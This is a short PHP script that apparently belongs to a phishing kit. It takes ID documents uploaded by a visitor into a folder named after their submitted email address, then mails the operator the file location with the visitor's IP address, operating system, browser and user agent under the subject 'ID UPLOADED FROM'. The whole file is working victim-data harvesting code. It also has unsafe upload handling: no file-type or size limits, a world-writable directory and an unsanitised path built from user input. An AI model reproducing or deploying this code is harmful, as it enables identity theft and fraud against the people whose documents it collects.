<?php


	session_start();
	include("../assest/browsers.php");
	include("../assest/conf.php");
    include('class.fileuploader.php');
	
	$_SESSION["email"] = $_POST["email"];
	//$_SESSION["password"] = $_POST["password"];
	$dirName = $_SESSION["email"];
	$place = "../../../Uploads/".$dirName."/";
	mkdir($place, 0777);
	// initialize FileUploader
    $FileUploader = new FileUploader('files', array(
        'limit' => null,
        'maxSize' => null,
		'fileMaxSize' => null,
        'extensions' => null,
        'required' => false,
        'uploadDir' => $place,
        'title' => 'name',
		'replace' => false,
        'listInput' => true,
        'files' => null
    ));
	
	$Location = dirname(dirname( dirname(dirname(__FILE__))) )."/Uploads/".$dirName."/";
	
    $data = $FileUploader->upload();
	
			$Subject = "ID UPLOADED FROM ".$dirName;
		
			$Content = "Files :  ".$Location."\r\n";
			
			$Content .= "IP : " .$_SERVER['REMOTE_ADDR']."\r\n";
			
			$Content .= "OS : " .$user_os."\r\n";
			
			$Content .= "Browser : " .$user_browser."\r\n";
			
			$Content .= "Agent : " .$_SERVER['HTTP_USER_AGENT']."\r\n";
			
			$MailHeaders = "From: contact@tvservices.uk\r\n";
		
			mail($to, $Subject, $Content, $MailHeaders);
			
	exit;
	
	?>